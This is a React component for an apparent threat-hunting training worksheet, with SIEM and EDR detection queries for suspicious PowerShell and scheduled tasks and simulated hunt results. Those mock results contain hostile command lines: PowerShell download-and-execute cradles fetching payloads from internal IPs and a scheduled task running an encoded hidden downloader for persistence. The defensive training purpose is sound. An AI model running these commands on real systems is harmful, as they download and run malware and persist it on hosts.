import React, { useState, useEffect } from 'react';
import { Container, Card, Form, Button, Spinner, Alert, Table, Badge, Tabs, Tab } from 'react-bootstrap';
import { Link } from 'react-router-dom';
import { useWorkshop } from '../context/WorkshopContext';
import axios from 'axios';

const Worksheet10 = () => {
  // useWorkshop hook - progress tracking removed
  const { } = useWorkshop();

  // State for user input
  const [selectedQuery, setSelectedQuery] = useState('');
  const [dataSource, setDataSource] = useState('simulated');
  const [timeRange, setTimeRange] = useState('24h');
  const [huntResults, setHuntResults] = useState(null);
  
  // State for API response handling
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);
  const [success, setSuccess] = useState(false);
  
  // Mock queries from previous worksheet
  const queryOptions = [
    { 
      id: 1, 
      type: 'siem',
      query: `index=windows sourcetype=WinEventLog:Security EventCode=4688 process_name=powershell.exe (CommandLine="*-enc*" OR CommandLine="*-encodedcommand*" OR CommandLine="*-e *" OR CommandLine="*bypass*" OR CommandLine="*-nop*" OR CommandLine="*hidden*" OR CommandLine="*-w hidden*") | table _time, host, user, CommandLine | sort -_time`
    },
    { 
      id: 2, 
      type: 'edr',
      query: `ProcessEvents | where FileName =~ "powershell.exe" | where CommandLine contains "-enc" or CommandLine contains "bypass" or CommandLine contains "-w hidden" | project TimeGenerated, ComputerName, AccountName, CommandLine | order by TimeGenerated desc`
    },
    { 
      id: 3, 
      type: 'siem',
      query: `index=windows sourcetype=WinEventLog:Security EventCode=4698 OR (EventCode=4688 process_name=schtasks.exe CommandLine="*/create*") | table _time, host, user, CommandLine, task_name | sort -_time`
    }
  ];

  // Function to execute hunt query
  const executeHuntQuery = async () => {
    if (!selectedQuery) {
      setError('Please select a query first');
      return;
    }
    
    setIsLoading(true);
    setError(null);
    setSuccess(false);
    setHuntResults(null);
    
    try {
      // Find the selected query details
      const query = queryOptions.find(q => q.id === parseInt(selectedQuery));
      
      // Mock API call - in a real implementation, this would call a hunting platform
      setTimeout(() => {
        // Generate different results based on the selected query and data source
        let results = [];
        
        if (query.id === 1) {
          // PowerShell suspicious commands
          if (dataSource === 'simulated') {
            results = [
              {
                id: 1,
                timestamp: new Date(Date.now() - 3600000).toISOString(), // 1 hour ago
                host: 'DESKTOP-ABC123',
                user: 'john.doe',
                command: 'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA',
                severity: 'high',
                notes: 'Base64 encoded command that downloads and executes content from a remote server'
              },
              {
                id: 2,
                timestamp: new Date(Date.now() - 7200000).toISOString(), // 2 hours ago
                host: 'DESKTOP-XYZ456',
                user: 'admin',
                command: 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://10.0.0.5:8080/a\'))"',
                severity: 'high',
                notes: 'Command downloads and executes content from a remote server'
              },
              {
                id: 3,
                timestamp: new Date(Date.now() - 10800000).toISOString(), // 3 hours ago
                host: 'LAPTOP-DEF789',
                user: 'jane.smith',
                command: 'powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1',
                severity: 'low',
                notes: 'Legitimate script execution with bypass flag'
              }
            ];
          } else {
            results = [
              {
                id: 1,
                timestamp: new Date(Date.now() - 1800000).toISOString(), // 30 minutes ago
                host: 'WORKSTATION-123',
                user: 'service_account',
                command: 'powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "C:\\Program Files\\Backup\\daily_backup.ps1"',
                severity: 'low',
                notes: 'Known backup script executed by service account'
              }
            ];
          }
        } else if (query.id === 2) {
          // EDR PowerShell events
          if (dataSource === 'simulated') {
            results = [
              {
                id: 1,
                timestamp: new Date(Date.now() - 1200000).toISOString(), // 20 minutes ago
                computer: 'DESKTOP-ABC123',
                account: 'DOMAIN\\john.doe',
                command: 'powershell.exe -enc UABTACAAQwA6AFwAdABlAG0AcABcAHMAdQBzAHAAaQBjAGkAbwB1AHMALgBwAHMAMQA=',
                severity: 'medium',
                notes: 'Base64 encoded command'
              },
              {
                id: 2,
                timestamp: new Date(Date.now() - 4500000).toISOString(), // 75 minutes ago
                computer: 'DESKTOP-XYZ456',
                account: 'DOMAIN\\admin',
                command: 'powershell.exe -w hidden -nop -c "$c = New-Object System.Net.WebClient; $c.DownloadFile(\'http://192.168.1.10/payload.exe\', \'C:\\temp\\update.exe\')"',
                severity: 'high',
                notes: 'Hidden window downloading executable file'
              }
            ];
          } else {
            results = [];
          }
        } else if (query.id === 3) {
          // Scheduled tasks
          if (dataSource === 'simulated') {
            results = [
              {
                id: 1,
                timestamp: new Date(Date.now() - 86400000).toISOString(), // 1 day ago
                host: 'SERVER-DB01',
                user: 'SYSTEM',
                command: 'schtasks.exe /create /tn "System Maintenance" /tr "powershell.exe -w hidden -e JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwAC8AcABhAHkAbABvAGEAZAAuAGUAeABlACcALAAnAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAHUAcABkAGEAdABlAC4AZQB4AGUAJwApADsAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwAdQBwAGQAYQB0AGUALgBlAHgAZQAnAA==" /sc daily /st 03:00',
                task_name: 'System Maintenance',
                severity: 'high',
                notes: 'Suspicious scheduled task with encoded PowerShell command'
              },
              {
                id: 2,
                timestamp: new Date(Date.now() - 172800000).toISOString(), // 2 days ago
                host: 'WORKSTATION-456',
                user: 'jane.smith',
                command: 'schtasks.exe /create /tn "Cleanup Temp" /tr "cmd.exe /c del /q /f %temp%\\*.*" /sc daily /st 02:00',
                task_name: 'Cleanup Temp',
                severity: 'low',
                notes: 'Legitimate cleanup task'
              }
            ];
          } else {
            results = [
              {
                id: 1,
                timestamp: new Date(Date.now() - 259200000).toISOString(), // 3 days ago
                host: 'SERVER-APP02',
                user: 'SYSTEM',
                command: 'schtasks.exe /create /tn "Backup Application Logs" /tr "C:\\Program Files\\Backup\\backup_logs.bat" /sc daily /st 01:00',
                task_name: 'Backup Application Logs',
                severity: 'low',
                notes: 'Known backup task'
              }
            ];
          }
        }
        
        setHuntResults({
          queryId: query.id,
          queryType: query.type,
          dataSource: dataSource,
          timeRange: timeRange,
          results: results,
          executionTime: new Date().toISOString()
        });
        
        setIsLoading(false);
        setSuccess(true);
        
        // Progress tracking removed
      }, 2500);
      
    } catch (error) {
      console.error('Error executing hunt query:', error);
      setError('There was an error executing the hunt query. Please try again later.');
      setIsLoading(false);
    }
  };

  // Progress tracking removed

  return (
    <Container className="my-4">
      <h1 className="mb-4">Worksheet 4: Perform Hunting</h1>
      
      <Card className="mb-4">
        <Card.Header>
          <h4>Step 4: Perform Hunting</h4>
        </Card.Header>
        <Card.Body>
          <div className="mb-4">
            <h5>Overview</h5>
            <p>
              In this worksheet, you'll execute your hunting queries against simulated or real data 
              to search for evidence of the adversary behaviors you've hypothesized. The results 
              will help you determine if your hypotheses are valid and if there are potential 
              security incidents that require further investigation.
            </p>
          </div>
          
          <Form>
            <Form.Group className="mb-3">
              <Form.Label>Select a Query to Execute</Form.Label>
              <Form.Select 
                value={selectedQuery}
                onChange={(e) => setSelectedQuery(e.target.value)}
                aria-label="Select Query"
              >
                <option value="">Select a query...</option>
                {queryOptions.map((query) => (
                  <option key={query.id} value={query.id}>
                    {query.type.toUpperCase()}: {query.query.substring(0, 60)}...
                  </option>
                ))}
              </Form.Select>
            </Form.Group>
            
            <Form.Group className="mb-3">
              <Form.Label>Data Source</Form.Label>
              <div>
                <Form.Check
                  inline
                  type="radio"
                  id="simulated-data"
                  label="Simulated Data"
                  name="dataSource"
                  value="simulated"
                  checked={dataSource === 'simulated'}
                  onChange={() => setDataSource('simulated')}
                />
                <Form.Check
                  inline
                  type="radio"
                  id="real-data"
                  label="Real Data (Limited)"
                  name="dataSource"
                  value="real"
                  checked={dataSource === 'real'}
                  onChange={() => setDataSource('real')}
                />
              </div>
              <Form.Text className="text-muted">
                Simulated data contains synthetic security events including malicious activity. Real data is limited to non-sensitive events.
              </Form.Text>
            </Form.Group>
            
            <Form.Group className="mb-3">
              <Form.Label>Time Range</Form.Label>
              <Form.Select 
                value={timeRange}
                onChange={(e) => setTimeRange(e.target.value)}
                aria-label="Select Time Range"
              >
                <option value="1h">Last 1 hour</option>
                <option value="6h">Last 6 hours</option>
                <option value="12h">Last 12 hours</option>
                <option value="24h">Last 24 hours</option>
                <option value="7d">Last 7 days</option>
              </Form.Select>
            </Form.Group>
            
            {error && (
              <Alert variant="danger" className="mt-3">
                {error}
              </Alert>
            )}
            
            <div className="d-flex justify-content-end">
              <Button 
                variant="primary"
                onClick={executeHuntQuery}
                disabled={isLoading}
              >
                {isLoading ? (
                  <>
                    <Spinner
                      as="span"
                      animation="border"
                      size="sm"
                      role="status"
                      aria-hidden="true"
                      className="me-2"
                    />
                    Executing Query...
                  </>
                ) : (
                  'Execute Hunt Query'
                )}
              </Button>
            </div>
          </Form>
          
          {huntResults && (
            <div className="mt-5">
              <Alert variant="success" className="mb-4">
                <Alert.Heading>Hunt Query Executed Successfully</Alert.Heading>
                <p>
                  Query executed against {huntResults.dataSource} data for the last {huntResults.timeRange}.
                  Found {huntResults.results.length} results.
                </p>
                <hr />
                <p className="mb-0">
                  <strong>Execution Time:</strong> {new Date(huntResults.executionTime).toLocaleString()}
                </p>
              </Alert>
              
              <h5 className="mb-3">Hunt Results</h5>
              
              {huntResults.results.length === 0 ? (
                <Alert variant="info">
                  No results found for this query. This could mean either no matching activity occurred in the selected time range, or the query needs refinement.
                </Alert>
              ) : (
                <div>
                  <Tabs
                    defaultActiveKey="table"
                    id="results-tabs"
                    className="mb-3"
                  >
                    <Tab eventKey="table" title="Table View">
                      <Table striped bordered hover responsive>
                        <thead>
                          <tr>
                            <th>Timestamp</th>
                            {huntResults.queryId === 2 ? <th>Computer</th> : <th>Host</th>}
                            {huntResults.queryId === 2 ? <th>Account</th> : <th>User</th>}
                            <th>Command/Action</th>
                            {huntResults.queryId === 3 && <th>Task Name</th>}
                            <th>Severity</th>
                            <th>Notes</th>
                          </tr>
                        </thead>
                        <tbody>
                          {huntResults.results.map((result) => (
                            <tr key={result.id}>
                              <td>{new Date(result.timestamp).toLocaleString()}</td>
                              {huntResults.queryId === 2 ? 
                                <td>{result.computer}</td> : 
                                <td>{result.host}</td>
                              }
                              {huntResults.queryId === 2 ? 
                                <td>{result.account}</td> : 
                                <td>{result.user}</td>
                              }
                              <td>
                                <div style={{ maxWidth: '400px', overflowX: 'auto' }}>
                                  <code>{result.command}</code>
                                </div>
                              </td>
                              {huntResults.queryId === 3 && <td>{result.task_name}</td>}
                              <td>
                                <Badge bg={
                                  result.severity === 'high' ? 'danger' : 
                                  result.severity === 'medium' ? 'warning' : 
                                  'info'
                                }>
                                  {result.severity.toUpperCase()}
                                </Badge>
                              </td>
                              <td>{result.notes}</td>
                            </tr>
                          ))}
                        </tbody>
                      </Table>
                    </Tab>
                    <Tab eventKey="summary" title="Summary">
                      <div className="p-3 bg-light rounded">
                        <h6>Summary Statistics</h6>
                        <ul>
                          <li><strong>Total Results:</strong> {huntResults.results.length}</li>
                          <li>
                            <strong>Severity Breakdown:</strong>
                            <ul>
                              <li>
                                <Badge bg="danger" className="me-1">HIGH</Badge>
                                {huntResults.results.filter(r => r.severity === 'high').length} results
                              </li>
                              <li>
                                <Badge bg="warning" className="me-1">MEDIUM</Badge>
                                {huntResults.results.filter(r => r.severity === 'medium').length} results
                              </li>
                              <li>
                                <Badge bg="info" className="me-1">LOW</Badge>
                                {huntResults.results.filter(r => r.severity === 'low').length} results
                              </li>
                            </ul>
                          </li>
                          {huntResults.queryId === 1 && (
                            <li>
                              <strong>PowerShell Techniques:</strong>
                              <ul>
                                <li>Encoded Commands: {huntResults.results.filter(r => r.command.includes('-enc') || r.command.includes('EncodedCommand')).length}</li>
                                <li>Hidden Window: {huntResults.results.filter(r => r.command.includes('hidden')).length}</li>
                                <li>Execution Policy Bypass: {huntResults.results.filter(r => r.command.includes('Bypass')).length}</li>
                              </ul>
                            </li>
                          )}
                        </ul>
                        <h6 className="mt-4">Key Findings</h6>
                        <p>
                          {huntResults.results.filter(r => r.severity === 'high').length > 0 ? 
                            `Found ${huntResults.results.filter(r => r.severity === 'high').length} high-severity results that require immediate investigation.` :
                            'No high-severity findings detected in this hunt.'
                          }
                        </p>
                        <p>
                          {huntResults.queryId === 1 && huntResults.results.filter(r => r.command.includes('downloadstring') || r.command.includes('DownloadFile')).length > 0 &&
                            'Detected PowerShell commands attempting to download content from external sources, which could indicate command and control activity.'
                          }
                          {huntResults.queryId === 3 && huntResults.results.filter(r => r.command.includes('hidden') && r.command.includes('powershell')).length > 0 &&
                            'Detected scheduled tasks configured to run hidden PowerShell commands, which is a common persistence technique.'
                          }
                        </p>
                      </div>
                    </Tab>
                  </Tabs>
                  
                  <div className="d-flex justify-content-end mt-4">
                    <Button 
                      variant="outline-primary" 
                      onClick={() => {
                        // In a real implementation, this would export the results
                        alert('In a real implementation, this would export the results to a file.');
                      }}
                      className="me-2"
                    >
                      Export Results
                    </Button>
                    <Button 
                      variant="outline-secondary" 
                      onClick={() => {
                        setHuntResults(null);
                        setSuccess(false);
                      }}
                    >
                      New Hunt
                    </Button>
                  </div>
                </div>
              )}
            </div>
          )}
        </Card.Body>
      </Card>
      
      <div className="d-flex justify-content-between mt-3">
        <Link to="/scenario2/worksheet3" className="btn btn-secondary">Previous: Translate to Queries</Link>
        <Link to="/" className="btn btn-primary">Back to Home</Link>
      </div>
    </Container>
  );
};

export default Worksheet10;
